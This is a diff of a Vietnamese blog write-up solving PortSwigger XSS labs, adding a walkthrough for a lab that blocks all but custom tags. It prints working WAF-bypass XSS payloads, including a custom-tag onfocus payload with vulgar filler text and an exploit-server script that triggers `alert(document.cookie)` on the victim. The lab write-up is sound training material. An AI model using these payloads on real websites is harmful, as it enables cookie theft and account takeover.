@@ -33,6 +33,8 @@ image:
 - Mã độc được thực thi bởi chính `JavaScript` phía client do thao tác với DOM mà không kiểm tra kỹ input.
 
 ## Solve XSS Labs
+[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
 ---
 
 ### Lab: Reflected XSS into HTML context with nothing encoded
@@ -502,7 +504,6 @@ Một số tag và atribute đã bị `WAF`, xảy ra 2 trường hợp:
 
 #### Exploit
 - Sử dụng **Burp Intruder** dể tự động hóa, kiểm tra các `tag, attribute` nào được phép sử dụng.
-- [Tag list](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/files/posts/2025-05-25-portswigger-cross-site-script/tag_líst.txt) - [Attribute list](https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/files/posts/2025-05-25-portswigger-cross-site-script/attribute_list.txt)
 - Sử dụng payload sau khi tìm được: `<body onresize=print()>`
 - Trong 1 page chỉ có được 1 thẻ body, khi ta thêm 1 thẻ nữa, nó sẽ chỉ thêm `attribute` vào body hiện có
 - Đến `Exploit Server` 
@@ -514,6 +515,37 @@ Một số tag và atribute đã bị `WAF`, xảy ra 2 trường hợp:
 
 - Deliver to victim
 - Kích hoạt sự kiện resize sau khi load `iframe` kéo theo sự kiện `onresize` làm cho `print()` được gọi
+
+### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
+- Mục tiêu: Thực hiện một cuộc tấn công `XSS` bỏ qua `WAF` và gọi hàm `print()`.
+- Loại `Reflect XSS`
+- Vị trí: Chức năng tìm kiếm
+
+Lab này yêu cầu tạo ra tag mới để thực thi `XSS` do tất cả các tag đã bị `block`
+
+Payload:
+```text
+<xnxx onfocus=alert() tabindex=1>F*CK ME</xnxx>
+```
+- Thêm `payload` và `search`
+
+Code inspect:
+```html
+<h1>0 search results for '
+    <xnxx onfocus="alert()" tabindex="1">F*CK ME</xnxx>'
+</h1>
+```
+
+- **tabindex = 1**: dùng để focus vào thẻ `xnxx` khi `tab` lần đầu hoặc `click` vào nó
+
+- Đến `Exploit Server` 
+- Thêm payload sau và **Deliver to victim**
+
+```html
+<script>
+    location = 'https://0a94008a046ae7f88119f220009200b6.web-security-academy.net/?search=%3Cxnxx+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
 
 ---
 Goodluck! 🍀🍀🍀
